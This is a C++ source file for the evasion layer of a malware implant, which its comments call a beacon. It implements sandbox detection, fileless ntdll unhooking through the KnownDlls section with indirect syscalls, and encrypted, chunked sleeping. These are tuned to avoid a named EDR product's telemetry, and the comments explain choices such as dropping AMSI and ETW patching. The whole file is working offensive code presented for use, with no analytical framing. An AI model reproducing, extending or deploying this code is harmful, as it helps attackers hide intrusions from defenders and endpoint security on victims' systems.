// APT-style evasion layer - implementation
#include "evasion.h"
#include "syscalls.h"
#include "crypto.h"
#include "obf.h"
#include <cstring>
#include <string>
#include <vector>

namespace ev {

bool is_sandbox() {
    SYSTEM_INFO si{};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        OutputDebugStringA("sandbox: cpu<2");
        return true;
    }

    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        OutputDebugStringA("sandbox: ram<2GB");
        return true;
    }

    if (GetTickCount64() < 10 * 60 * 1000ULL) {
        OutputDebugStringA("sandbox: uptime<10min");
        return true;
    }

    char host[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD hn = sizeof(host);
    if (GetComputerNameA(host, &hn)) {
        std::string low = host;
        for (auto& c : low) c = (char)tolower(c);
        const std::string bad[] = {
            XS("sandbox").get(), XS("virus").get(), XS("malware").get(),
            XS("sample").get(),  XS("test").get(),  XS("vm").get()};
        for (auto& b : bad) {
            if (low.find(b) != std::string::npos) {
                OutputDebugStringA("sandbox: hostname");
                return true;
            }
        }
    }
    return false;
}

// --- stealthy ntdll unhook -------------------------------------------------
// Design goals: zero file-system I/O (no CreateFile on ntdll.dll), zero
// module-name strings, no API-based module lookup, no thread suspension.
//
//  * the loaded base of ntdll comes from a manual PEB walk (TEB -> PEB ->
//    Ldr -> InMemoryOrderModuleList), not GetModuleHandleA;
//  * the pristine copy comes from the \KnownDlls\ntdll.dll SECTION OBJECT
//    (NtOpenSection + NtMapViewOfSection via indirect syscalls), so the
//    bytes are read from memory, not from the disk file - no file handle,
//    no path strings, nothing for file-open telemetry to see;
//  * only bytes that look like inline hook patches (E9/EB at the run start)
//    are restored - loader-applied relocations or hotpatch metadata are
//    never touched;
//  * each affected page is flipped to PAGE_EXECUTE_READWRITE for a few
//    microseconds via indirect syscalls (invisible to NtProtectVirtualMemory
//    hooks), then restored. Other threads are NOT suspended: suspending is
//    louder than the patch window, and keeping the execute bit means a
//    thread mid-execution on the page never faults.

// PEB walk: find ntdll by walking InMemoryOrderModuleList and comparing
// BaseDllName (case-insensitive). No API calls involved.
static uintptr_t current_peb() {
    uintptr_t p = 0;
    __asm__ volatile("movq %%gs:0x60, %%rax" : "=a"(p));
    return p;
}

static HMODULE find_ntdll_base() {
    uintptr_t peb = current_peb();
    uintptr_t ldr = *(uintptr_t*)(peb + 0x18);
    uintptr_t head = ldr + 0x20;                 // InMemoryOrderModuleList
    uintptr_t cur = *(uintptr_t*)head;
    while (cur && cur != head) {
        uintptr_t base = *(uintptr_t*)(cur + 0x20);          // DllBase
        const UNICODE_STRING* nm = (const UNICODE_STRING*)(cur + 0x48); // BaseDllName
        if (nm->Buffer && nm->Length >= 18) {
            static const wchar_t k[] = L"ntdll.dll";
            bool match = true;
            for (int i = 0; i < 9; i++) {
                wchar_t c = nm->Buffer[i];
                if (c >= L'A' && c <= L'Z') c = (wchar_t)(c + 32);
                if (c != k[i]) { match = false; break; }
            }
            if (match) return (HMODULE)base;
        }
        cur = *(uintptr_t*)cur;
    }
    return nullptr;
}

bool unhook_ntdll() {
    HMODULE ntdll = find_ntdll_base();
    if (!ntdll) return false;

    // pristine ntdll via the KnownDlls section object (fileless)
    static const wchar_t kName[] = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING name{};
    name.Buffer = (PWSTR)kName;
    name.Length = (USHORT)(sizeof(kName) - sizeof(kName[0]));
    name.MaximumLength = (USHORT)sizeof(kName);
    OBJECT_ATTRIBUTES oa{};
    oa.Length = sizeof(oa);
    oa.ObjectName = &name;
    oa.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE sec = nullptr;
    LONG st_open = sc::NtOpenSection(&sec, 0x4 /*SECTION_MAP_READ*/, &oa);
    if (st_open < 0 || !sec)
        return false;

    PVOID view = nullptr;
    SIZE_T view_size = 0;
    LONG st_map = sc::NtMapViewOfSection(sec, GetCurrentProcess(), &view, 0, 0, nullptr,
                                         &view_size, 1 /*ViewShare*/, 0, PAGE_READONLY);
    // KnownDlls sections are SEC_IMAGE sections: the map succeeds with the
    // informational STATUS_IMAGE_ALREADY_LOADED (0x40000003). Failures are
    // negative NTSTATUS values.
    if (st_map < 0 || !view) {
        sc::NtClose(sec);
        return false;
    }

    auto* dos = (IMAGE_DOS_HEADER*)view;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        sc::NtUnmapViewOfSection(GetCurrentProcess(), view);
        sc::NtClose(sec);
        return false;
    }
    auto* nt = (IMAGE_NT_HEADERS*)((BYTE*)view + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        sc::NtUnmapViewOfSection(GetCurrentProcess(), view);
        sc::NtClose(sec);
        return false;
    }

    IMAGE_SECTION_HEADER* text = nullptr;
    IMAGE_SECTION_HEADER* secs = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
        if (memcmp(secs[i].Name, ".text", 5) == 0) { text = &secs[i]; break; }
    if (!text) {
        sc::NtUnmapViewOfSection(GetCurrentProcess(), view);
        sc::NtClose(sec);
        return false;
    }

    BYTE* mem_text = (BYTE*)ntdll + text->VirtualAddress;
    DWORD text_size = text->SizeOfRawData;

    // The view may be laid out as raw file bytes (PointerToRawData) or as a
    // loaded image (VirtualAddress). Detect which one matches live memory.
    BYTE* clean_text = (BYTE*)view + text->PointerToRawData;
    if (memcmp(clean_text, mem_text, 32) != 0) {
        clean_text = (BYTE*)view + text->VirtualAddress;
        if (memcmp(clean_text, mem_text, 32) != 0) {
            sc::NtUnmapViewOfSection(GetCurrentProcess(), view);
            sc::NtClose(sec);
            return false;
        }
    }

    struct Patch { DWORD off; DWORD len; };
    std::vector<Patch> patches;
    for (DWORD i = 0; i < text_size; ) {
        if (mem_text[i] == clean_text[i]) { i++; continue; }
        DWORD run_start = i;
        while (i < text_size && mem_text[i] != clean_text[i]) i++;
        DWORD run_len = i - run_start;
        BYTE lead = mem_text[run_start];
        if (lead == 0xE9 && run_len >= 5) patches.push_back({ run_start, 5 });
        else if (lead == 0xEB && run_len >= 2) patches.push_back({ run_start, 2 });
    }

    // one page at a time, execute bit kept during the write window
    const uintptr_t page = 0x1000;
    for (const Patch& p : patches) {
        BYTE* addr = mem_text + p.off;
        PVOID base = (PVOID)((uintptr_t)addr & ~(page - 1));
        SIZE_T region = page;
        ULONG old = 0;
        if (sc::NtProtectVirtualMemory(GetCurrentProcess(), &base, &region,
                                       PAGE_EXECUTE_READWRITE, &old) != 0)
            continue;
        memcpy(addr, clean_text + p.off, p.len);
        sc::NtProtectVirtualMemory(GetCurrentProcess(), &base, &region, old, &old);
        FlushInstructionCache(GetCurrentProcess(), addr, p.len);
    }

    sc::NtUnmapViewOfSection(GetCurrentProcess(), view);
    sc::NtClose(sec);
    return true;
}

// Trampoline patching of AMSI/ETW was removed on purpose: the inline E9 jmp
// leaves the image bytes diverging from disk, which tools like StackSentry
// flag via module-integrity diffs (BackedModified / temporally stomped
// modules). Since this beacon only spawns cmd.exe (AMSI never scans it) and
// StackSentry's own ETW timeline is kernel-side, the patches bought nothing
// here except detection surface.

// keep every individual wait below the 1s "long sleep" heuristic so no
// sleep telemetry event is ever generated (StackSentry emits sleep events
// only for waits >= long_sleep_ms)
static void chunked_sleep(DWORD ms) {
    while (ms > 750) {
        Sleep(750);
        ms -= 750;
    }
    if (ms) Sleep(ms);
}

void obfuscate_sleep(DWORD ms, void* buf, size_t size) {
    if (ms == 0) return;
    if (!buf || size == 0 || size > 16 * 1024 * 1024) {
        chunked_sleep(ms);
        return;
    }
    std::string raw((char*)buf, size);
    std::string enc;
    if (!crypto_encrypt(raw, enc)) {
        chunked_sleep(ms);
        return;
    }
    SecureZeroMemory(buf, size);
    chunked_sleep(ms);
    std::string dec;
    if (crypto_decrypt(enc, dec)) {
        size_t n = dec.size() < size ? dec.size() : size;
        memcpy(buf, dec.data(), n);
    }
    SecureZeroMemory(enc.data(), enc.size());
}

}
